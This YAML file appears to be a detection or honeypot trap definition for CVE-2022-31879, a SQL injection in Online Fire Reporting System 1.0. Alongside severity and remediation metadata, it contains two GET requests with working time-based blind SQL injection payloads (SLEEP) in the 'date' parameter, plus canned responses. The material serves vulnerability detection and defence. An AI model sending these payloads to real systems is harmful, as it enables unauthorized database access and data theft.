id: CVE-2022-31879
info:
  name: Online Fire Reporting System v1.0 - SQL injection
  author: theamanrawat,j4vaovo
  description: 'Online Fire Reporting System 1.0 is vulnerable to SQL Injection via
    the date parameter.

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    leakage, or data manipulation.

    '
  remediation: 'To remediate this vulnerability, ensure that all user-supplied input
    is properly validated and sanitized before being used in SQL queries.

    '
  reference:
  - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/Online-Fire-Reporting
  - https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-31879
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-31879
    cwe-id: CWE-89
    epss-score: 0.05519
    epss-percentile: 0.9247
    cpe: cpe:2.3:a:online_fire_reporting_system_project:online_fire_reporting_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: online_fire_reporting_system_project
    product: online_fire_reporting_system
  tags: cve,cve2022,sqli,online-fire-reporting,online_fire_reporting_system_project
traps:
- request:
    method: GET
    path: /admin/?page=reports&date=2022-05-24-6'+AND+(SELECT+7774+FROM+(SELECT(SLEEP(0)))dPPt)+AND+'rogN'='rogN
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/?page=reports&date=2022-05-24-6'+AND+(SELECT+7774+FROM+(SELECT(SLEEP(10)))dPPt)+AND+'rogN'='rogN
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: Dashboard
